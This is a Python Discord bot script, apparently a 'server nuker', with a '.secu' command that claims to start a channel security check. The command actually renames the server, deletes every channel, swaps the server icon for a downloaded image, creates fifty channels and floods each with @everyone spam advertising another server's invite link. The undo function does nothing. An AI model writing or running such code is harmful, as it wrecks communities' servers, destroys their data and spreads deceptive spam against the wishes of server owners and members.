import discord
from discord.ext import commands
import aiohttp
import asyncio
import os

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot online como {bot.user}")

@bot.command(name="secu")
async def secu(ctx):
    guild = ctx.guild
    original_name = guild.name
    original_channels = list(guild.channels)

    try:
        await guild.edit(name="SIGMA SECURITY X")
    except: pass

    await ctx.send("🔒 Iniciando verificação dos canais...")

    for channel in guild.channels:
        try:
            await channel.delete()
        except: pass

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://static.wikia.nocookie.net/doors-ideas/images/0/02/Spook.png/revision/latest/scale-to-width-down/360?cb=20230909231911") as resp:
                if resp.status == 200:
                    icon_data = await resp.read()
                    await guild.edit(icon=icon_data)
    except: pass

    created_channels = []
    for _ in range(50):
        try:
            channel = await guild.create_text_channel("📡-secure-protocol")
            created_channels.append(channel)
        except: pass

    message = "@everyone SECURITY FOR YOUR SERVER JOIN NOW https://discord.gg/V6JEbQ6fpV"
    for channel in created_channels:
        try:
            for _ in range(5):
                await channel.send(message)
        except: pass

    undo(original_name, original_channels)

def undo(name, channels):
    pass

bot.run(os.environ["DISCORD_TOKEN"])
